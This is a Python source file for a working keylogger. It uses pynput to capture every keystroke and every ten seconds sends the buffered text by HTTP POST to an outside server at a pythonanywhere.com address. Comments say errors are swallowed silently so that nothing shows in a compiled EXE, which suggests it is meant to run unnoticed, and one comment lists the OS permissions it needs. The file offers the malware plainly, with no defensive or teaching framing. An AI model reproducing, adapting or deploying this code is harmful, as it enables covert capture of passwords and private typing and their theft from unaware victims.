from pynput import keyboard
import requests
import threading
from datetime import datetime

# OBS: allow IDE Input Monitoring, Accessibility, Full Disk Access in OS settings

class SimpleKeyLogger:
    def __init__(self, server_url):
        self.server_url = server_url
        self.text = ""
        self.time_interval = 10  # Send every 10 seconds

    """Send the captured text to server"""
    def send_to_server(self):
        if self.text.strip():  # Only send if there's actual text
            try:
                payload = {
                    "keyboard_data": self.text,
                    "timestamp": datetime.now().isoformat()
                }

                response = requests.post(
                    f"{self.server_url}/log",
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )

                if response.status_code == 200:
                    self.text = ""  # Clear after successful send
                # Silent fail - don't show errors in EXE

            except Exception:
                pass # Silent fail for EXE

        # Schedule next send
        timer = threading.Timer(self.time_interval, self.send_to_server)
        timer.daemon = True
        timer.start()

    """Handle key press events"""
    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt]:
                pass
            elif key == keyboard.Key.esc:
                # Stop kelogger
                if self.text:
                    self.send_to_server() # Send any remaining text before stopping
                return False
            else:
                self.text += str(key).strip("'")

        except AttributeError:
            pass # Ignore special key errors

    """Start the keylogger"""
    def start(self):
        self.send_to_server() # Start the periodic sending

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join() # Start listening to keyboard

def main():
    SERVER_URL = "https://antma001.pythonanywhere.com"
    logger = SimpleKeyLogger(SERVER_URL)
    logger.start()

if __name__ == "__main__":
    main()